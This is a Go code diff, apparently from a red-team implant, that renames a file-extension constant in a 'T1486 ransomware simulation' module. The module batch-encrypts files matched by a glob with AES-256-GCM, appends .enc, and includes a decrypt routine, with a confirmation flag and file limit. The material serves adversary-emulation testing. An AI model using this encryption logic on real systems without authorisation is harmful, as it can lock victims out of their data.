@@ -156,7 +156,7 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	return successResult(sb.String())
 }
 
-const fawkesEncExt = ".enc"
+const encryptedFileExt = ".enc"
 
 // encryptFiles performs batch file encryption by glob pattern (T1486 ransomware simulation).
 // Safety: requires -confirm SIMULATE and enforces max_files limit.
@@ -187,7 +187,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 			continue
 		}
 		// Skip already-encrypted files
-		if strings.HasSuffix(m, fawkesEncExt) {
+		if strings.HasSuffix(m, encryptedFileExt) {
 			continue
 		}
 		files = append(files, m)
@@ -238,7 +238,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 		ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 		structs.ZeroBytes(plaintext)
 
-		outPath := path + fawkesEncExt
+		outPath := path + encryptedFileExt
 		if err := os.WriteFile(outPath, ciphertext, 0600); err != nil {
 			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
 			continue
@@ -256,7 +256,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("Pattern: %s\n", args.Path))
 	sb.WriteString(fmt.Sprintf("Files encrypted: %d/%d\n", encrypted, len(files)))
 	sb.WriteString(fmt.Sprintf("Total bytes: %d\n", totalBytes))
-	sb.WriteString(fmt.Sprintf("Extension: %s\n", fawkesEncExt))
+	sb.WriteString(fmt.Sprintf("Extension: %s\n", encryptedFileExt))
 	sb.WriteString("Algorithm: AES-256-GCM\n")
 	sb.WriteString(fmt.Sprintf("Recovery Key (base64): %s\n", base64.StdEncoding.EncodeToString(key)))
 	if len(errors) > 0 {
@@ -306,7 +306,7 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 			if err != nil {
 				return nil
 			}
-			if !fi.IsDir() && strings.HasSuffix(path, fawkesEncExt) {
+			if !fi.IsDir() && strings.HasSuffix(path, encryptedFileExt) {
 				files = append(files, path)
 			}
 			return nil
@@ -315,7 +315,7 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 		// Try as glob pattern
 		matches, _ := filepath.Glob(args.Path)
 		for _, m := range matches {
-			if strings.HasSuffix(m, fawkesEncExt) {
+			if strings.HasSuffix(m, encryptedFileExt) {
 				files = append(files, m)
 			}
 		}
@@ -351,7 +351,7 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 		structs.ZeroBytes(ciphertext)
 
 		// Restore original filename by removing .enc extension
-		outPath := strings.TrimSuffix(path, fawkesEncExt)
+		outPath := strings.TrimSuffix(path, encryptedFileExt)
 		if err := os.WriteFile(outPath, plaintext, 0600); err != nil {
 			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
 			structs.ZeroBytes(plaintext)
